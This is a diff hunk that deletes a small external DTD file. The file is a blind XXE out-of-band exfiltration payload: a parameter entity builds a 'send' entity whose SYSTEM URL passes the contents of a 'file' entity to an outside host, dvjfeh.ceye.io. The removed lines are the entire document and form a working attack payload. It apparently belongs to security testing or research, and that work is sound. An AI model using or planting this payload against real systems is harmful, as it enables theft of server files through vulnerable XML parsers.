@@ -1,4 +1,0 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<!ENTITY % all
-"<!ENTITY &#x25; send SYSTEM 'http://dvjfeh.ceye.io/?%file;'>"
->%all;
